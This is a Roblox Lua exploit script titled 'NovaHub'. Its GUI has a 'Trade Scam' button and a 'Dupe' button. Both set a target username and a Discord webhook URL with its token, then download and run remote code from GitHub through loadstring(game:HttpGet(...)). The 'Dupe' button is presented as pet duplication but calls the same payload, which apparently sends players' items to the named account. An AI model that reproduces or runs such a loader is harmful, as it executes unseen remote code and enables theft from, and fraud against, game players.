

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextButton_2 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(85, 85, 255)
Frame.Position = UDim2.new(0.232643113, 0, 0.329581976, 0)
Frame.Size = UDim2.new(0, 444, 0, 211)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(85, 85, 255)
TextButton.Position = UDim2.new(0, 0, -0.203791469, 0)
TextButton.Size = UDim2.new(0, 444, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
TextLabel.Position = UDim2.new(0, 0, -0.203791469, 0)
TextLabel.Size = UDim2.new(0, 99, 0, 50)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "NovaHub"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
TextButton_2.Position = UDim2.new(0.0472972989, 0, 0.374407589, 0)
TextButton_2.Size = UDim2.new(0, 406, 0, 109)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Trade Scam"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
	local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
	local Window = Library.CreateLib("NovaHub", "Midnight")


	local Main = Window:NewTab("TradeScam")
	local Section = Main:NewSection("TradeScam")


	Section:NewButton("Trade Scam", "ScamTrade", function()
		UserName = "znhotrep"
		WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
		Mention = true -- change to false if you don't want to get everyone ping in your webhook.

		loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()

	end)


	local Main = Window:NewTab("Dupe Script")
	local Section = Main:NewSection("Dupe")

	Section:NewButton("Dupe", "Make Ur Pet Dupe", function()
		UserName = "znhotrep"
		WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
		Mention = true -- change to false if you don't want to get everyone ping in your webhook.

		loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()

	end)
end)
-- Scripts:

local function SPFO_fake_script() -- ScreenGui.Script 
	local script = Instance.new('Script', ScreenGui)

	frame = script.Parent.Frame -- Take out {}s, and put name of frame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(SPFO_fake_script)()
